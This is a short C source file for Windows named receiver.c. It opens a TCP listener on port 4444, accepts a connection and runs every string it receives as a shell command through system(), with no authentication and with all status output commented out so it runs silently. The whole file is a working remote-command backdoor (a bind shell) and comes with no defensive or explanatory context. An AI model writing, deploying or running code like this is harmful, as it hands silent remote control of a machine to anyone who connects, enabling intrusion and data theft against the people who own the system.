// receiver.c
#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>

#pragma comment(lib, "ws2_32.lib") // Link against Winsock library

#define PORT 4444
#define BUFFER_SIZE 1024

int main() {
    WSADATA wsa;
    SOCKET server_socket, client_socket;
    struct sockaddr_in server, client;
    char buffer[BUFFER_SIZE];
    int client_len = sizeof(client);

    // Initialize Winsock
    // printf("Initializing Winsock...\n");
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        // printf("Failed. Error Code: %d\n", WSAGetLastError());
        return 1;
    }

    // Create server socket
    if ((server_socket = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        // printf("Could not create socket: %d\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY;  // Bind to any available address
    server.sin_port = htons(PORT);

    // Bind socket
    if (bind(server_socket, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) {
        // printf("Bind failed: %d\n", WSAGetLastError());
        closesocket(server_socket);
        WSACleanup();
        return 1;
    }

    // Listen for incoming connections
    listen(server_socket, 3);
    // printf("Listening for incoming connections on port %d...\n", PORT);

    // Accept a client connection
    if ((client_socket = accept(server_socket, (struct sockaddr *)&client, &client_len)) == INVALID_SOCKET) {
        // printf("Accept failed: %d\n", WSAGetLastError());
        closesocket(server_socket);
        WSACleanup();
        return 1;
    }

    // printf("Client connected. Awaiting commands...\n");

    // Receive and execute commands
    while (1) {
        int recv_size = recv(client_socket, buffer, BUFFER_SIZE - 1, 0);
        if (recv_size == SOCKET_ERROR) {
            // printf("Recv failed: %d\n", WSAGetLastError());
            break;
        }

        buffer[recv_size] = '\0';  // Null-terminate received data
        // printf("Received command: %s\n", buffer);

        // Execute the command
        system(buffer);

        // Send response (optional)
        char *response = "";
        send(client_socket, response, strlen(response), 0);
    }

    // Cleanup
    closesocket(client_socket);
    closesocket(server_socket);
    WSACleanup();
    return 0;
}